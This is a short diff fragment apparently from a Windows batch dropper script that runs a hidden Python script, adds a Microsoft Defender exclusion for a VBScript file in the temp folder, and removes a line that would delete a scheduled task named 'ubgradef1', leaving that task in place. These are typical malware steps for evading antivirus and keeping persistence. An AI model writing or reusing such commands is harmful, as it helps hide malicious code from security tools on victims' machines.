@@ -5,7 +5,7 @@ py a.pyw
 
 cd %temp%
 powershell -Command "Add-MpPreference -ExclusionPath '%temp%\d.vbs'"
-schtasks /delete /tn "ubgradef1" /f
+
 
 
 
